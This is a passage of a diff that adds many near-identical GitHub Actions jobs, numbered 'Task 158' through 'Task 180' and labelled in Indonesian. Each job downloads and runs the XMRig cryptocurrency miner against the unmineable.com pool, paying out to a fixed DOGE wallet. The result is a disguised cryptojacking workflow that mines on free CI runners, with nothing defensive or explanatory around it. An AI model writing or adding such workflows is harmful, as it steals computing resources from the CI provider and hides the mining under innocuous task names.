+    name: Start Task 158
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 158
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_159:
+    name: Start Task 159
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 159
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_160:
+    name: Start Task 160
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 160
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_161:
+    name: Start Task 161
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 161
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_162:
+    name: Start Task 162
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 162
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_163:
+    name: Start Task 163
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 163
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_164:
+    name: Start Task 164
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 164
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_165:
+    name: Start Task 165
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 165
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_166:
+    name: Start Task 166
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 166
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_167:
+    name: Start Task 167
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 167
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_168:
+    name: Start Task 168
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 168
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_169:
+    name: Start Task 169
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 169
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_170:
+    name: Start Task 170
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 170
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_171:
+    name: Start Task 171
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 171
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_172:
+    name: Start Task 172
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 172
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_173:
+    name: Start Task 173
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 173
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_174:
+    name: Start Task 174
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 174
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_175:
+    name: Start Task 175
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 175
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_176:
+    name: Start Task 176
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 176
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_177:
+    name: Start Task 177
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 177
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_178:
+    name: Start Task 178
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 178
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_179:
+    name: Start Task 179
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 179
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_180:
+    name: Start Task 180
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 180
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
